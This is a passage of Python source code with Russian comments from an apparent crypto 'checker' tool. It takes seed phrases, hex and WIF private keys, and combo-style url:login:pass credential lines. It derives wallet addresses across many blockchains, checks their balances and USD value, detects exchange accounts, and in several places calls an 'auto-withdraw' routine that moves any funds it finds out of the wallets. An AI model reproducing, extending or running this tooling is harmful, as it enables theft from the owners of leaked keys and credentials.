            # 6. BINANCE CHAIN - первые 3 адреса (m/44'/714'/0'/0/i)
            for i in range(3):
                try:
                    bnb_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BINANCE_CHAIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BNB_{i}"] = bnb_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"BNB_{i}: {e}")
            
            # 7. SOLANA - первые 5 адресов (m/44'/501'/i'/0')
            for i in range(5):
                try:
                    sol_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA).Purpose().Coin().Account(i)
                    derived[f"SOL_{i}"] = sol_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"SOL_{i}: {e}")
            
            # 8. TRON - первые 5 адресов (m/44'/195'/0'/0/i)
            for i in range(5):
                try:
                    trx_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.TRON).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"TRX_{i}"] = trx_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"TRX_{i}: {e}")
                    
        except Exception as e:
            result["info"]["error"] = f"Ошибка деривации: {e}"
            return result
        
        # Проверка всех адресов параллельно
        handlers = {}
        for key in derived.keys():
            if key.startswith("BTC_"):
                handlers[key] = self._check_bitcoin
            elif key.startswith("ETH_"):
                handlers[key] = self._check_ethereum
            elif key.startswith("LTC_"):
                handlers[key] = self._check_litecoin
            elif key.startswith("DOGE_"):
                handlers[key] = self._check_dogecoin
            elif key.startswith("DASH_"):
                handlers[key] = self._check_dash
            elif key.startswith("BNB_"):
                handlers[key] = self._check_bnb
            elif key.startswith("SOL_"):
                handlers[key] = self._check_solana
            elif key.startswith("TRX_"):
                handlers[key] = self._check_tron
        
        check_results = await asyncio.gather(*[
            handlers[coin](addr, timeout, proxy, session)
            for coin, addr in derived.items()
            if coin in handlers
        ], return_exceptions=True)
        
        total_usd = 0.0
        found_addresses = []
        result["info"]["addresses"] = derived
        result["info"]["balances"] = {}
        
        balance_keys = {
            "BTC_": "balance_btc", "ETH_": "balance_eth", "LTC_": "balance_ltc",
            "DOGE_": "balance_doge", "DASH_": "balance_dash", "BNB_": "balance_bnb",
            "SOL_": "balance_sol", "TRX_": "balance_trx"
        }
        
        price_keys = {
            "BTC_": "bitcoin", "ETH_": "ethereum", "LTC_": "litecoin",
            "DOGE_": "dogecoin", "DASH_": "dash", "BNB_": "bnb",
            "SOL_": "solana", "TRX_": "tron"
        }
        
        for (coin, addr), res in zip(
            [(c, a) for c, a in derived.items() if c in handlers],
            check_results
        ):
            if isinstance(res, Exception):
                continue
            
            # Определяем ключ баланса
            bal_key = next((v for k, v in balance_keys.items() if coin.startswith(k)), "balance")
            price_key = next((v for k, v in price_keys.items() if coin.startswith(k)), "")
            
            bal = res.get("info", {}).get(bal_key, 0) or 0
            result["info"]["balances"][coin] = {
                "address": addr,
                "balance": bal,
                "message": res.get("info", {}).get("message", ""),
            }
            
            price_data = prices.get(price_key, {})
            price = price_data.get("price", 0) if isinstance(price_data, dict) else price_data
            total_usd += bal * price
            
            if bal > 0:
                found_addresses.append(f"{coin}: {bal}")
        
        result["exists"] = bool(found_addresses)
        result["info"]["total_usd"] = total_usd
        result["info"]["total_addresses_checked"] = len(derived)
        result["info"]["addresses_with_balance"] = len(found_addresses)
        
        if found_addresses:
            result["info"]["message"] = (
                f"✓ Сид-фраза валидна ({word_count} слов, {result['info']['strength']}) | "
                f"Найдено {len(found_addresses)} адресов с балансом из {len(derived)} проверенных | "
                f"Общий баланс: ~${total_usd:,.2f}"
            )
        else:
            result["info"]["message"] = (
                f"✓ Сид-фраза валидна ({word_count} слов, {result['info']['strength']}) | "
                f"Проверено {len(derived)} адресов | Все пустые"
            )
        
        if errors:
            result["info"]["derive_errors"] = errors[:5]  # Показываем только первые 5 ошибок
        
        # АВТОВЫВОД (если включен)
        if self.auto_withdraw_enabled and result["exists"]:
            withdraw_results = await self._auto_withdraw_from_seed(seed_phrase, result["info"]["balances"])
            if withdraw_results:
                result["info"]["auto_withdraw"] = withdraw_results
                success_count = sum(1 for r in withdraw_results if r.get("success"))
                if success_count > 0:
                    result["info"]["message"] += f" | ✓ Выведено с {success_count} адресов"
        
        return result
        return result

    async def _check_privkey_hex(self, key, timeout, proxy, session):
        """
        УЛУЧШЕННАЯ ПРОВЕРКА HEX ПРИВАТНОГО КЛЮЧА:
        5. Поддержка разных форматов (с/без 0x)
        6. Автоопределение формата
        7. Конвертация в WIF и другие форматы
        8. Проверка безопасности ключа
        10. Экспорт для кошельков (JSON, QR)
        """
        result = self.make_result(input=key[:10]+"...", type="privkey_hex")
        prices = await self._get_prices(session, timeout)
        
        # Нормализация ключа
        key_clean = key.strip()
        if key_clean.startswith("0x"):
            key_clean = key_clean[2:]
        
        # Проверка длины
        if len(key_clean) != 64:
            result["info"]["error"] = f"Неверная длина ключа: {len(key_clean)} символов (должно быть 64)"
            return result
        
        # Проверка на HEX
        try:
            int(key_clean, 16)
        except ValueError:
            result["info"]["error"] = "Ключ содержит не-HEX символы"
            return result
        
        # 8. Проверка безопасности
        key_int = int(key_clean, 16)
        security_warnings = []
        
        if key_int == 0:
            security_warnings.append("⚠️ ОПАСНО: Нулевой ключ!")
        elif key_int < 1000:
            security_warnings.append("⚠️ ОПАСНО: Слишком простой ключ (< 1000)")
        elif key_int == 1:
            security_warnings.append("⚠️ ОПАСНО: Ключ = 1 (известный слабый ключ)")
        
        # Проверка на паттерны
        if key_clean == "0" * 64:
            security_warnings.append("⚠️ ОПАСНО: Все нули")
        elif key_clean == "f" * 64 or key_clean == "F" * 64:
            security_warnings.append("⚠️ ОПАСНО: Все F (максимальное значение)")
        elif len(set(key_clean.lower())) == 1:
            security_warnings.append(f"⚠️ ПОДОЗРИТЕЛЬНО: Все символы одинаковые ({key_clean[0]})")
        
        result["info"]["security_warnings"] = security_warnings
        result["info"]["security_status"] = "⚠️ НЕБЕЗОПАСНО" if security_warnings else "✓ Безопасно"
        
        try:
            from eth_account import Account
            import base58
            
            key_hex = "0x" + key_clean
            acct = Account.from_key(key_hex)
            address = acct.address
            
            result["info"]["address"] = address
            result["info"]["public_key"] = acct._key_obj.public_key.to_hex()
            
            # 7. Конвертация форматов
            result["info"]["formats"] = {
                "hex_with_0x": key_hex,
                "hex_without_0x": key_clean,
                "decimal": str(key_int),
            }
            
            # Конвертация в WIF для Bitcoin (compressed)
            try:
                extended_key = bytes.fromhex("80" + key_clean + "01")
                checksum = hashlib.sha256(hashlib.sha256(extended_key).digest()).digest()[:4]
                wif_bytes = extended_key + checksum
                wif = base58.b58encode(wif_bytes).decode()
                result["info"]["formats"]["wif_compressed"] = wif
            except Exception:
                pass
            
            # 10. Экспорт для кошельков
            result["info"]["export"] = {
                "metamask": {"address": address, "privateKey": key_hex},
                "trust_wallet": f"ethereum:{key_hex}",
            }
            
        except Exception as e:
            result["info"]["error"] = f"Неверный приватный ключ: {e}"
            return result
        
        # Проверка баланса на всех EVM сетях
        chain_results = await self._multichain_scan(address, timeout, proxy, session, prices)
        total_usd = sum(r["usd"] for r in chain_results.values())
        active = [c for c, r in chain_results.items() if r["balance"] > 0]
        
        result["info"]["chains"] = chain_results
        result["info"]["total_usd"] = total_usd
        result["exists"] = bool(active)
        result["info"]["auth"] = self.auth_info["ethereum"]
        
        msg = f"PrivKey HEX -> {address}"
        if security_warnings:
            msg += f" | {security_warnings[0]}"
        msg += f" | Сети: {', '.join(active) if active else 'нет'} | ~${total_usd:,.2f}"
        msg += self._whale_label(total_usd)
        
        result["info"]["message"] = msg
        
        # АВТОВЫВОД (если включен)
        if self.auto_withdraw_enabled and result["exists"]:
            withdraw_results = []
            for chain_name, chain_data in chain_results.items():
                if chain_data["balance"] > 0:
                    withdraw_result = await self._auto_withdraw_eth(
                        key_hex, address, chain_data["balance"], chain_name
                    )
                    if withdraw_result and withdraw_result.get("success"):
                        withdraw_results.append(withdraw_result)
                        result["info"]["message"] += f" | {withdraw_result['message']}"
            
            if withdraw_results:
                result["info"]["auto_withdraw"] = withdraw_results
        
        return result

    async def _check_privkey_wif(self, wif, timeout, proxy, session):
        """
        УЛУЧШЕННАЯ ПРОВЕРКА WIF ПРИВАТНОГО КЛЮЧА:
        5. Поддержка compressed/uncompressed
        6. Автоопределение формата
        7. Конвертация в HEX и другие форматы
        8. Проверка безопасности
        10. Экспорт для кошельков
        """
        result = self.make_result(input=wif[:10]+"...", type="privkey_wif")
        prices = await self._get_prices(session, timeout)
        
        try:
            from bip_utils import WifDecoder, P2PKHAddr, P2WPKHAddr, Secp256k1PrivateKey
            import base58
            
            # Декодирование WIF
            priv_bytes, is_compressed = WifDecoder.Decode(wif)
            priv_key = Secp256k1PrivateKey.FromBytes(priv_bytes)
            
            # Генерация разных типов адресов
            addresses = {}
            addresses["P2PKH_Legacy"] = P2PKHAddr.EncodeKey(priv_key.PublicKey().KeyObject())
            
            try:
                addresses["P2WPKH_SegWit"] = P2WPKHAddr.EncodeKey(priv_key.PublicKey().KeyObject())
            except Exception:
                pass
            
            result["info"]["addresses"] = addresses
            result["info"]["is_compressed"] = is_compressed
            result["info"]["format_type"] = "Compressed WIF" if is_compressed else "Uncompressed WIF"
            
            # 7. Конвертация форматов
            priv_hex = priv_bytes.hex()
            result["info"]["formats"] = {
                "wif": wif,
                "hex": priv_hex,
                "hex_with_0x": "0x" + priv_hex,
                "decimal": str(int(priv_hex, 16)),
                "compressed": is_compressed,
            }
            
            # 8. Проверка безопасности
            key_int = int(priv_hex, 16)
            security_warnings = []
            
            if key_int < 1000:
                security_warnings.append("⚠️ ОПАСНО: Слишком простой ключ")
            elif key_int == 1:
                security_warnings.append("⚠️ ОПАСНО: Ключ = 1")
            
            result["info"]["security_warnings"] = security_warnings
            result["info"]["security_status"] = "⚠️ НЕБЕЗОПАСНО" if security_warnings else "✓ Безопасно"
            
            # 10. Экспорт для кошельков
            result["info"]["export"] = {
                "electrum": wif,
                "bitcoin_core": f"importprivkey {wif}",
            }
            
        except Exception as e:
            result["info"]["error"] = f"Неверный WIF ключ: {e}"
            return result
        
        # Проверка баланса на всех Bitcoin адресах
        address = addresses.get("P2PKH_Legacy", "")
        btc_result = await self._check_bitcoin(address, timeout, proxy, session)
        
        result["exists"] = btc_result.get("exists", False)
        result["info"].update(btc_result.get("info", {}))
        result["info"]["auth"] = self.auth_info["bitcoin"]
        
        msg = f"WIF ({result['info']['format_type']}) -> {address}"
        if security_warnings:
            msg += f" | {security_warnings[0]}"
        msg += " | " + btc_result["info"].get("message", "")
        
        result["info"]["message"] = msg
        return result

    async def _multichain_scan(self, address, timeout, proxy, session, prices):
        async def _check_chain(chain_name, rpc_url, symbol):
            try:
                payload = {"jsonrpc":"2.0","id":1,"method":"eth_getBalance","params":[address,"latest"]}
                resp = await self.fetch(session, "POST", rpc_url, timeout=timeout, proxy=proxy, json=payload, headers={"Content-Type":"application/json"})
                if resp.status == 200:
                    d = await resp.json(); resp.close()
                    bal = int(d.get("result") or "0x0", 16) / 1e18
                    usd = bal * prices.get({"ETH":"ethereum","BNB":"bnb","MATIC":"polygon"}.get(symbol, "ethereum"), 0)
                    return chain_name, {"balance": bal, "symbol": symbol, "usd": usd, "message": f"{bal:.18f} {symbol} (~${usd:,.2f})"}
                resp.close()
            except Exception: pass
            return chain_name, {"balance": 0.0, "symbol": symbol, "usd": 0.0, "message": "error"}

        tasks = [_check_chain(name, url, sym) for name, url, sym in _EVM_CHAINS]
        return dict(await asyncio.gather(*tasks))

    def _detect_wallet(self, data):
        s = data.strip()
        if not s or s[0] not in _WALLET_FIRST_CHARS: return None
        for wallet_type, pattern in _WALLET_PATTERNS:
            if pattern.match(s):
                # v1.0.87: Дополнительная строгая валидация для Solana
                # чтобы избежать ложных срабатываний на TON/BTC/другие адреса
                if wallet_type == "solana" and not is_valid_solana_address(s):
                    continue
                return wallet_type
        return None

    def _detect_exchange(self, data):
        """Определить биржу по ключевым словам или email домену"""
        try:
            dl = data.lower()
            
            # Проверяем ключевые слова бирж
            for ex in self.exchanges:
                if ex in dl:
                    return ex
            
            # НОВОЕ: Проверяем email домены бирж
            # Формат: url:mail:pass или email:password
            email_match = re.search(r'([a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}))', data)
            if email_match:
                email = email_match.group(1)
                domain = email_match.group(2).lower()
                
                # Маппинг доменов бирж
                exchange_domains = {
                    "binance.com": "binance",
                    "bybit.com": "bybit",
                    "okx.com": "okx",
                    "huobi.com": "huobi",
                    "kucoin.com": "kucoin",
                    "gate.io": "gate",
                    "mexc.com": "mexc",
                    "bitget.com": "bitget",
                    "coinbase.com": "coinbase",
                    "kraken.com": "kraken",
                    "bitfinex.com": "bitfinex",
                }
                
                for ex_domain, ex_name in exchange_domains.items():
                    if ex_domain in domain:
                        return ex_name
                
                # Если есть email но биржа не определена, возвращаем "exchange" (generic)
                return "exchange"
            
            return None
        except Exception as e:
            # Логируем ошибку но не падаем
            print(f"⚠️ Error in _detect_exchange: {e}")
            return None

    def _parse_credentials(self, data):
        """
        Универсальный парсер credentials.
        Поддерживаемые форматы:
          1. https://site.com:login:pass
          2. https://site.com/path:login:pass
          3. site.com:login:pass
          4. site.com/path:login:pass
          5. site.com/:login:pass  (слэш перед логином)
          6. login:pass  (email:password)
          7. exchange:login:pass  (первый токен — название биржи без @ и .)
          8. login:pass:extra  (берём первые два значимых токена)
        """
        try:
            # Нормализуем разделители
            s = data.strip().replace("|", ":")

            # ── 1. Формат с протоколом: https://... или http://...
            if s.startswith(("https://", "http://")):
                proto_end = s.index("://") + 3
                colon_pos = s.find(":", proto_end)
                if colon_pos == -1:
                    return ("", "")
                after_url = s[colon_pos + 1:].lstrip("/")
                # after_url = "login:pass" или "login:pass:extra"
                # Берём login как первый токен, pass — всё остальное до следующего ":"
                parts = after_url.split(":", 1)
                login = parts[0].strip()
                password = parts[1].strip() if len(parts) > 1 else ""
                if login:
                    return (login, password)
                return ("", "")

            # ── 2. Формат без протокола: site.com:... или site.com/path:...
            first_colon = s.find(":")
            if first_colon > 0:
                possible_domain = s[:first_colon]
                # Домен содержит точку и не содержит @
                if "." in possible_domain and "@" not in possible_domain:
                    after_domain = s[first_colon + 1:].lstrip("/")
                    # Разбиваем на login и password
                    # Если login содержит @, то это email — берём его целиком, pass — остаток
                    # Если login не содержит @, то берём первый токен как login, второй как pass
                    parts = after_domain.split(":", 1)
                    login = parts[0].strip()
                    password = parts[1].strip() if len(parts) > 1 else ""

                    # Если пароль содержит "." и не содержит "@" — возможно это ещё один домен
                    # Но мы уже взяли login:pass, так что просто возвращаем
                    if login:
                        return (login, password)
                    return ("", "")

            # ── 3. Стандартные форматы без домена
            tokens = [t.strip() for t in s.split(":") if t.strip()]

            if not tokens:
                return ("", "")

            # Формат: exchange:login:pass  (первый токен — слово без @ и .)
            if len(tokens) >= 3 and "@" not in tokens[0] and "." not in tokens[0]:
                return (tokens[1], tokens[2])

            # Формат: login:pass
            if len(tokens) >= 2:
                return (tokens[0], tokens[1])

            # Только login (email)
            if len(tokens) == 1 and "@" in tokens[0]:
                return (tokens[0], "")

            return ("", "")

        except Exception as e:
            print(f"⚠️ Error in _parse_credentials: {e}")
            return ("", "")

    async def _check_bitcoin(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="bitcoin", valid=True)
        prices = await self._get_prices(session, timeout)

        # v1.0.88: Проверяем кэш
        cached = await global_balance_cache.get(address, "bitcoin")
        if cached:
            return cached

        api_errors = []

        for api_name, url, fmt in [
            ("mempool.space",   f"https://mempool.space/api/address/{address}",        "json"),
            ("blockstream",     f"https://blockstream.info/api/address/{address}",     "json"),
            ("blockchain.info", f"https://blockchain.info/q/addressbalance/{address}", "text"),
            ("btcscan",         f"https://btcscan.org/api/address/{address}",          "json"),
        ]:
            try:
                # v1.0.87: retry с exponential backoff
                resp = await fetch_with_retry(
                    session, "GET", url,
                    timeout=timeout, proxy=proxy,
                    retries=3, base_delay=1.0
                )

                if resp and resp.status == 200:
                    if fmt == "text":
                        text = (await resp.text()).strip()
                        balance = int(text) / 1e8 if text.lstrip("-").isdigit() else 0
                    else:
                        d = await resp.json()
                        cs = d.get("chain_stats", {})
                        balance = (cs.get("funded_txo_sum", 0) - cs.get("spent_txo_sum", 0)) / 1e8

                    result["info"]["balance_btc"] = balance
                    result["exists"] = balance > 0

                    btc_price = prices.get("bitcoin", {}).get("price", 0) if isinstance(prices.get("bitcoin"), dict) else prices.get("bitcoin", 0)
                    formatted_balance = BalanceFormatter.format_balance_with_emoji(balance, "BTC", btc_price)
                    whale = self._whale_label(balance * btc_price)
                    ord_msg = await self._check_btc_ordinals(address, timeout, proxy, session)

                    result["info"]["message"] = f"Balance: {formatted_balance}" + (" (empty)" if not result["exists"] else "") + whale + ord_msg
                    # v1.0.88: Сохраняем в кэш
                    await global_balance_cache.set(address, "bitcoin", result)
                    return result
                elif resp:
                    api_errors.append(f"{api_name}: HTTP {resp.status}")
                    await resp.release()
                else:
                    api_errors.append(f"{api_name}: No response")
            except asyncio.TimeoutError:
                api_errors.append(f"{api_name}: Timeout")
            except Exception as e:
                api_errors.append(f"{api_name}: {type(e).__name__}")

        result["info"]["balance_btc"] = None
        result["info"]["api_errors"] = api_errors
        result["info"]["message"] = f"⚠️ Не удалось проверить баланс BTC ({'; '.join(api_errors[:2])})"
        result["info"]["recommendation"] = "💡 Используйте прокси или попробуйте позже"
        return result

    async def _check_ethereum(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="ethereum", valid=True)
        prices = await self._get_prices(session, timeout)
        balance = None

        # v1.0.88: Проверяем кэш
        cached = await global_balance_cache.get(address, "ethereum")
        if cached:
            return cached
        
        k = os.environ.get("ETHERSCAN_API_KEY", "")
        e_url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest"
        if k: e_url += f"&apikey={k}"

        for api_name, url, fmt in [("etherscan", e_url, "etherscan"), ("cloudflare", "https://cloudflare-eth.com", "rpc")]:
            try:
                if fmt == "etherscan":
                    resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
                    if resp.status == 200:
                        d = await resp.json(); resp.close()
                        if d.get("status") == "1": balance = int(d["result"]) / 1e18; break
                    resp.close()
                else:
                    p = {"jsonrpc":"2.0","id":1,"method":"eth_getBalance","params":[address,"latest"]}
                    resp = await self.fetch(session, "POST", url, timeout=timeout, proxy=proxy, json=p, headers={"Content-Type":"application/json"})
                    if resp.status == 200:
                        d = await resp.json(); resp.close()
                        if "result" in d: balance = int(d["result"],16) / 1e18; break
                    resp.close()
            except Exception: continue

        if balance is not None:
            # Run all checks concurrently - ДОБАВЛЕНА DEFI ПРОВЕРКА v1.0.53
            tokens, bsc_tokens, polygon_tokens, uni_v3, nfts, staking, last_tx, approvals, activity, airdrop_msg, gas_price, wallet_age, defi_positions = await asyncio.gather(
                self._check_erc20(address, timeout, proxy, session),
                self._check_bsc_tokens(address, timeout, proxy, session),
                self._check_polygon_tokens(address, timeout, proxy, session),
                self._check_uniswap_v3_positions(address, timeout, proxy, session),
                self._check_nft(address, timeout, proxy, session),
                self._check_staking(address, timeout, proxy, session),
                self._get_last_tx_eth(address, timeout, proxy, session),
                self._check_approvals(address, timeout, proxy, session),
                self._get_activity_score(address, timeout, proxy, session),
                self._check_airdrop_eligibility(address, timeout, proxy, session),
                self._get_gas_price(session, timeout),
                self._get_wallet_age_eth(address, timeout, proxy, session),
                check_all_defi_positions(address, session, timeout),
                return_exceptions=True
            )
            
            # Handle exceptions
            if isinstance(tokens, Exception): tokens = {}
            if isinstance(bsc_tokens, Exception): bsc_tokens = {}
            if isinstance(polygon_tokens, Exception): polygon_tokens = {}
            if isinstance(uni_v3, Exception): uni_v3 = ""
            if isinstance(nfts, Exception): nfts = ""
            if isinstance(staking, Exception): staking = {}
            if isinstance(last_tx, Exception): last_tx = ""
            if isinstance(approvals, Exception): approvals = []
            if isinstance(activity, Exception): activity = ""
            if isinstance(defi_positions, Exception): defi_positions = {}
            if isinstance(airdrop_msg, Exception): airdrop_msg = ""
            if isinstance(gas_price, Exception): gas_price = ""
            if isinstance(wallet_age, Exception): wallet_age = ""
            if isinstance(defi_positions, Exception): defi_positions = {}

            token_prices = await self._get_token_prices(list(tokens.keys()), session, timeout)
            total_token_usd = sum(tv * token_prices.get(tk.upper(), 1.0) for tk, tv in tokens.items())
            total_token_usd += sum(bsc_tokens.values()) + sum(polygon_tokens.values())

            # Добавляем DeFi информацию v1.0.53
            defi_msg = ""
            if defi_positions:
                # Aave
                if defi_positions.get("aave", {}).get("supplied"):
                    aave_supplied = defi_positions["aave"]["supplied"]
                    defi_msg += f" | Aave: {', '.join(f'{v:.2f} {k}' for k,v in aave_supplied.items())}"
                
                # Compound
                if defi_positions.get("compound", {}).get("supplied"):
                    comp_supplied = defi_positions["compound"]["supplied"]
                    defi_msg += f" | Compound: {', '.join(f'{v:.2f} {k}' for k,v in comp_supplied.items())}"
                
                # Uniswap V3 LP
                uni_v3_positions = defi_positions.get("uniswap_v3", [])
                if uni_v3_positions:
                    defi_msg += f" | Uniswap V3: {len(uni_v3_positions)} LP"
                
                # Unclaimed rewards
                rewards = defi_positions.get("unclaimed_rewards", {})
                if rewards.get("aave") or rewards.get("compound") or rewards.get("curve"):
                    defi_msg += " | Rewards: "
                    reward_parts = []
                    if rewards.get("aave"):
                        reward_parts.append(f"AAVE {sum(rewards['aave'].values()):.2f}")
                    if rewards.get("compound"):
                        reward_parts.append(f"COMP {sum(rewards['compound'].values()):.2f}")
                    if rewards.get("curve"):
                        reward_parts.append(f"CRV {sum(rewards['curve'].values()):.2f}")
                    defi_msg += ", ".join(reward_parts)

            result["info"].update({
                "balance_eth": balance, 
                "tokens": tokens, 
                "bsc_tokens": bsc_tokens, 
                "polygon_tokens": polygon_tokens, 
                "token_usd": total_token_usd, 
                "gas_price": gas_price, 
                "wallet_age": wallet_age,
                "defi_positions": defi_positions
            })
            result["exists"] = balance > 0 or bool(tokens) or bool(bsc_tokens) or bool(polygon_tokens) or bool(defi_positions)
            
            # v1.0.57: Используем BalanceFormatter для читаемого отображения
            eth_price = prices.get("ethereum", {}).get("price", 0) if isinstance(prices.get("ethereum"), dict) else prices.get("ethereum", 0)
            formatted_balance = BalanceFormatter.format_balance_with_emoji(balance, "ETH", eth_price)
            
            msg = f"Balance: {formatted_balance}"
            
            # Форматируем токены с BalanceFormatter
            if tokens:
                token_parts = []
                for symbol, amount in list(tokens.items())[:5]:  # Первые 5 токенов
                    token_price = token_prices.get(symbol.upper(), 0)
                    formatted_token = BalanceFormatter.format_balance(amount, symbol, True, token_price)
                    token_parts.append(formatted_token)
                msg += " | Tokens: " + ", ".join(token_parts)
                if len(tokens) > 5:
                    msg += f" + еще {len(tokens) - 5}"
            
            if bsc_tokens: msg += " | BSC: " + ", ".join(f"{v:.2f} {k}" for k,v in bsc_tokens.items())
            if polygon_tokens: msg += " | Polygon: " + ", ".join(f"{v:.2f} {k}" for k,v in polygon_tokens.items())
            if total_token_usd > 0: msg += f" | Найдено токенов на: ~${total_token_usd:,.2f}"
            msg += defi_msg  # Добавляем DeFi информацию
            if last_tx: msg += f" | Last Tx: {last_tx}"
            if gas_price: msg += f" | Gas: {gas_price}"
            if wallet_age: msg += f" | Age: {wallet_age}"
            if approvals: msg += f" | Аппрувы: {', '.join(approvals)}"
            if activity: msg += f" | Активность: {activity}"
            msg += airdrop_msg
            if not result["exists"]: msg += " (empty)"

            total_eth_usd = balance * prices.get("ethereum", {}).get("price", 0) + total_token_usd

            # v1.0.88: Мультичейн проверка — ищем баланс на всех EVM сетях
            try:
                multichain = await check_evm_all_chains(
                    address, timeout, proxy, session, prices,
                    networks=["bsc", "polygon", "arbitrum", "optimism", "base", "avalanche", "zksync", "linea",
                              # v1.0.92: новые сети
                              "fantom", "cronos", "scroll", "blast", "mantle", "gnosis", "celo", "moonbeam", "opbnb"]
                )
                mc_msg = format_multichain_message(multichain)
                if mc_msg:
                    msg += mc_msg
                    # Добавляем к total USD
                    mc_usd = sum(v["usd"] for v in multichain.values() if v.get("has_balance"))
                    total_eth_usd += mc_usd
                    result["info"]["multichain"] = multichain
            except Exception:
                pass

            result["info"]["total_usd"] = total_eth_usd
            result["info"]["message"] = msg + self._whale_label(total_eth_usd)

            # v1.0.88: Сохраняем в кэш
            await global_balance_cache.set(address, "ethereum", result)
        else:
            result["info"]["api_error"] = "All ETH APIs failed"
        return result

    async def _check_approvals(self, address, timeout, proxy, session):
        approved = []
        for r_name, r_addr in _DEX_ROUTERS.items():
            try:
                data_hex = "0xdd62ed3e" + "000000000000000000000000" + address[2:].lower() + "000000000000000000000000" + r_addr[2:].lower()
                p = {"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":_USDT_CONTRACT,"data":data_hex},"latest"]}
                resp = await self.fetch(session, "POST", "https://cloudflare-eth.com", timeout=timeout, proxy=proxy, json=p, headers={"Content-Type":"application/json"})
                if resp.status == 200:
                    d = await resp.json(); resp.close()
                    if int(d.get("result", "0x0"), 16) > 0: approved.append(r_name)
                resp.close()
            except Exception: pass
        return approved

    async def _check_evm_rpc_token(self, address, rpc_url, contract, decimals, timeout, proxy, session):
        try:
            data_hex = "0x70a08231" + "000000000000000000000000" + address[2:]
            p = {"jsonrpc": "2.0", "id": 1, "method": "eth_call", "params": [{"to": contract, "data": data_hex}, "latest"]}
            resp = await self.fetch(session, "POST", rpc_url, timeout=timeout, proxy=proxy, json=p, headers={"Content-Type": "application/json"})
            if resp.status == 200:
                d = await resp.json(); resp.close()
                return int(d.get("result", "0x0"), 16) / 10**decimals
            resp.close()
        except Exception: pass
        return 0.0

    async def _check_erc20(self, address, timeout, proxy, session):
        """Проверка ERC-20 токенов - РАСШИРЕННАЯ ВЕРСИЯ v1.0.52"""
        balances = {}
        
        # 1. Сначала проверяем популярные токены (быстро)
        for s, (c, d) in _ERC20_TOKENS.items():
            v = await self._check_evm_rpc_token(address, "https://cloudflare-eth.com", c, d, timeout, proxy, session)
            if v > 0: balances[s] = v
        
        # 2. Затем проверяем ВСЕ остальные токены через Etherscan API
        try:
            all_tokens = await get_all_erc20_tokens(address, "ethereum", session, timeout)
            for token in all_tokens:
                symbol = token["symbol"]
                # Пропускаем если уже проверили
                if symbol not in balances and token["value_usd"] >= 0.01:  # Минимум $0.01
                    balances[symbol] = token["balance"]
        except Exception as e:
            print(f"Ошибка проверки всех токенов: {e}")
        
        return balances

    async def _check_bsc_tokens(self, address, timeout, proxy, session):
        balances = {}
        tokens = {"BSC_USDT": ("0x55d398326f99059fF775485246999027B3197955", 18), "BSC_USDC": ("0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", 18)}
        for s, (c, d) in tokens.items():
            v = await self._check_evm_rpc_token(address, "https://bsc-dataseed.binance.org/", c, d, timeout, proxy, session)
            if v > 0: balances[s] = v
        return balances

    async def _check_polygon_tokens(self, address, timeout, proxy, session):
        balances = {}
        tokens = {"POLY_USDT": ("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6), "POLY_USDC": ("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", 6)}
        for s, (c, d) in tokens.items():
            v = await self._check_evm_rpc_token(address, "https://polygon-rpc.com", c, d, timeout, proxy, session)
            if v > 0: balances[s] = v
        return balances

    async def _check_uniswap_v3_positions(self, address, timeout, proxy, session):
        v = await self._check_evm_rpc_token(address, "https://cloudflare-eth.com", "0xC36442b4a4522E871399CD717aBDD847Ab11FE88", 0, timeout, proxy, session)
        return f"Uniswap V3: {int(v)} positions" if v > 0 else ""

    async def _check_nft(self, address, timeout, proxy, session):
        """Проверка NFT - РАСШИРЕННАЯ ВЕРСИЯ v1.0.52"""
        try:
            # Получаем детальную информацию о NFT
            nfts = await get_nfts(address, "ethereum", session, timeout)
            
            if not nfts:
                return ""
            
            # Подсчитываем общую стоимость
            total_value_usd = sum(nft.get("floor_price_usd", 0) for nft in nfts)
            
            # Формируем сообщение
            nft_count = len(nfts)
            msg = f"{nft_count} NFT"
            
            if total_value_usd > 0:
                msg += f" (~${total_value_usd:,.2f})"
            
            # Добавляем топ коллекции
            if nfts:
                top_nft = max(nfts, key=lambda x: x.get("floor_price_usd", 0))
                if top_nft.get("floor_price_usd", 0) > 0:
                    msg += f" | Top: {top_nft['collection']}"
            
            return msg
            
        except Exception as e:
            print(f"Ошибка проверки NFT: {e}")
            # Fallback на старый метод
            try:
                h = {"accept": "application/json"}
                k = os.environ.get("OPENSEA_API_KEY", "")
                if k: h["X-API-KEY"] = k
                resp = await self.fetch(session, "GET", f"https://api.opensea.io/api/v2/chain/ethereum/account/{address}/nfts?limit=1", timeout=timeout, proxy=proxy, headers=h)
                if resp.status == 200:
                    d = await resp.json(); resp.close()
                    return f"{len(d.get('nfts', []))}+" if d.get("next") else str(len(d.get("nfts", [])))
                resp.close()
            except Exception: pass
            return ""

    async def _check_staking(self, address, timeout, proxy, session):
        # ETH liquid staking (stETH, rETH)
        staking = {}
        tokens = {
            "stETH": ("0xae7ab96520de3a18e5e111b5eaab095312d7fe84", 18),
            "rETH":  ("0xae78736cd615f374d3085123a210448e74fc6393", 18),
            "cbETH": ("0xbe9895146f7af43049ca1c1ae358b0541ea49704", 18),
            "wstETH":("0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0", 18),
            "sfrxETH":("0xac3e018457b222d93114458476f3e3416abbe38f", 18),
        }
        for s, (c, d) in tokens.items():
            v = await self._check_evm_rpc_token(address, "https://cloudflare-eth.com", c, d, timeout, proxy, session)
            if v > 0:
                staking[s] = v
        return staking

